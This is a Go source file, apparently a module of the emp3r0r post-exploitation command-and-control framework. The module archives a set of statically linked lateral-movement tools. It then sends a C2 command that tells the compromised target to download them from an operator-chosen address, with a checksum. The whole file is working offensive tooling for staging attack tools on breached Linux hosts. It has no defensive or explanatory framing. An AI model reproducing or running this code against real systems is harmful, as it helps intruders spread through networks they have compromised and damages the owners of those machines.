//go:build linux
// +build linux

package cc

import (
	"fmt"
	"os"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// upload a zip file that packs several lateral-movement tools
// statically linked, built under alpine
func moduleVaccine() {
	go func() {
		err := CreateVaccineArchive()
		if err != nil {
			LogError("CreateVaccineArchive: %v", err)
			return
		}
		downloadOpt, ok := CurrentModuleOptions["download_addr"]
		if !ok {
			LogError("Option 'download_addr' not found")
			return
		}
		download_addr := downloadOpt.Val
		checksum := tun.SHA256SumFile(UtilsArchive)
		err = SendCmd(fmt.Sprintf("%s --checksum %s --download_addr %s", emp3r0r_def.C2CmdUtils, checksum, download_addr), "", CurrentTarget)
		if err != nil {
			LogError("SendCmd failed: %v", err)
		}
	}()
}

func CreateVaccineArchive() (err error) {
	LogInfo("Creating archive (%s) for module vaccine...", UtilsArchive)
	err = os.Chdir(EmpDataDir + "/modules/vaccine") // vaccine is always stored under EmpDataDir
	if err != nil {
		return fmt.Errorf("entering vaccine dir: %v", err)
	}
	defer func() {
		LogInfo("Created %.2fMB archive (%s) for module vaccine", float64(util.FileSize(UtilsArchive))/1024/1024, UtilsArchive)
		os.Chdir(EmpWorkSpace)
	}()
	err = util.TarXZ(".", UtilsArchive)
	if err != nil {
		return fmt.Errorf("creating vaccine archive: %v", err)
	}
	return
}
